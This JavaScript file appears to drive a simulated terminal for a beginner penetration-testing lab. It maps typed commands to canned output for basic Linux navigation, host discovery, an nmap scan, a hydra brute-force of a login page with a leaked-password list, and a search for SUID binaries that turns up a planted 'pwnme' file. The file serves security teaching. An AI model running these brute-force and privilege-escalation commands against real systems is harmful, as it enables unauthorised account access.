// ===== HELP LINES =====
// ===== LESSON 1: BASICS =====

const helpLinesBasics = [
  "",
  "<span class='command'>pwd</span>    show current directory",
  "<span class='command'>ls</span>     list files and folders",
  "<span class='command'>ls -l</span>  detailed list with permissions",
  "<span class='command'>cd</span>     change directory",
  "<span class='command'>cat</span>    show file contents",
  "<span class='command'>id</span>     show user id and groups",
  "<span class='command'>unzip</span>  Unzips a zipped file",
  "<span class='command'>wc</span>     Count number of words in a file.",
  ""
];

const commandsBasics = {
  help: helpLinesBasics.join("\n"),
  clear: "",

  pwd: "/home/student",

  ls: "Documents  Downloads  notes.txt",

  "ls -l":
    "total 12\n" +
    "-rw-r--r-- 1 student student  4096 Nov 17 09:12 notes.txt\n" +
    "drwxr-xr-x 2 student student  4096 Nov 17 09:10 Documents\n" +
    "drwxr-xr-x 5 student student  4096 Nov 17 09:11 Downloads",

  "cd Documents": "",
  "ls Documents": "report.txt  todo.txt",

  "cat readmePLZ.txt":
    "WELL DOne on getting up to here.\n" +  
     "                                \n" +
    "You have now a readmePLZ.txt and hackme.txt file.\n" +
    "                                                 \n" +
    "HOPE you have found the username because hackme.txt file contains 1000s of leaked password\n" +
    "You are going to use this password to crack into login page.\n" +
    "                          \n" +
    "ENJOY. \n",

  id: "uid=1000(student) gid=1000(student) groups=1000(student)",

  "unzip important.txt":
      "Archive:  important.zip\n" +
      "inflating: hackme.txt\n"  +
      "inflating: readmePLZ.txt",

  "wc -w hackme.txt":
      "1046 hackme.txt",
  
};


// ===== LESSON 2: ENUMERATION LAB =====

// ===== LESSON 2: ENUMERATION LAB =====

const helpLinesEnum = [
  "",
  "<span class='command'>sudo netdiscover</span>  Discover hosts in the network",
  "<span class='command'>ping</span>              Verify if host is alive",
  "<span class='command'>nmap</span>              Scan ports & services",
  "<span class='command'>hydra</span>             Brute-force login form",
  "<span class='command'>find</span>              Search SUID binaries",
  "",
  "Use only the commands shown in this lesson.",
  ""
];

const commandsEnum = {
  help: helpLinesEnum.join("\n"),
  clear: "",

  // --- netdiscover ---
  "sudo netdiscover -r 10.38.1.0": [
    "net discover:",
    "Currently scanning: Finished!   |   Screen View: Unique Hosts",
    "",
    "2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120",
    "--------------------------------------------------------------------------",
    "IP            At MAC Address        Count   Len   MAC Vendor / Hostname",
    "--------------------------------------------------------------------------",
    "10.38.1.1     08:00:27:4c:73:a9      1      60    PCS Systemtechnik GmbH",
    "10.38.1.117   08:00:27:11:89:84      1      60    PCS Systemtechnik GmbH"
  ].join("\n"),

  // --- ping ---
  "ping -c 3 10.38.1.117": [
    "PING 10.38.1.117 (10.38.1.117) 56(84) bytes of data",
    "64 bytes from 10.38.1.117: icmp_seq=1 ttl=64 time=1.73 ms",
    "64 bytes from 10.38.1.117: icmp_seq=2 ttl=64 time=1.13 ms",
    "64 bytes from 10.38.1.117: icmp_seq=3 ttl=64 time=0.885 ms",
    "",
    "--- 10.38.1.117 ping statistics ---",
    "3 packets transmitted, 3 received, 0% packet loss, time 2032ms",
    "rtt min/avg/max/mdev = 0.885/1.246/1.725/0.352 ms"
  ].join("\n"),

  // --- nmap ---
  "nmap -sV -O 10.38.1.117": [
    "Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 19:46 GMT",
    "Nmap scan report for 10.38.1.117",
    "Host is up (0.0014s latency).",
    "Not shown: 998 closed tcp ports (reset)",
    "PORT      STATE SERVICE VERSION",
    "22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)",
    "80/tcp    open  http    nginx 1.24.0 (Ubuntu)",
    "MAC Address: 08:00:27:11:89:84 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)",
    "Device type: general purpose",
    "Running: Linux 4.X|5.X",
    "OS CPE: cpe:/o:linux:linux_kernel:4  cpe:/o:linux:linux_kernel:5",
    "OS details: Linux 4.15 - 5.19",
    "Network Distance: 1 hop",
    "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
    "",
    "OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .",
    "Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds"
  ].join("\n"),

  // --- hydra ---
  "hydra -l hari -P hackme.txt 10.38.1.117 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid credentials.' -V": [
    "Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak",
    "",
    "Hydra starting at 2025-11-12 22:39:44",
    "[DATA] max 7 tasks per 1 server, overall 7 tasks",
    "[DATA] attacking http-post-form://10.38.1.117:80/login.php:user=^USER^&pass=^PASS^:Invalid credentials.",
    '[ATTEMPT] login "hari" pass "rednosedude"',
    '[ATTEMPT] login "hari" pass "clownpants"',
    '[ATTEMPT] login "hari" pass "balloonman"',
    '[ATTEMPT] login "hari" pass "redNose123"',
    '[ATTEMPT] login "hari" pass "silly123"',
    '[ATTEMPT] login "hari" pass "funnyw00d"',
    '[ATTEMPT] login "hari" pass "WL"',
    "",
    "[80][http-post-form] SUCCESS: login: <code>hari</code>  password: <code>laureDai247</code>",
    "",
    "1 valid password found.",
    "Hydra finished at 2025-11-12 22:39:45"
  ].join("\n"),

  "find / -perm -4000 -type f -exec ls -l {} \\; 2>/dev/null": [
    "-rwsr-xr-x 1 root root 64152 May 30  2024 /usr/bin/passwd",
    "-rwsr-xr-x 1 root root 44760 May 30  2024 /usr/bin/chsh",
    "-rwsr-xr-x 1 root root 39296 Jun  5 12:17 /usr/bin/umount",
    "-rwsr-xr-x 1 root root 72792 May 30  2024 /usr/bin/chfn",
    "-rwsr-xr-x 1 root root 342632 Aug 26 13:49 /usr/lib/openssh/ssh-keysign",
    "-rwsr-xr-x 1 root root 18736 Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1",
    "-rwsr-xr-- 1 root messagebus 34960 Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper",
    "-rwsr-xr-x 1 root root 16048 Nov  5 16:26 <code>/usr/local/bin/pwnme</code>"
  ].join("\n")
};

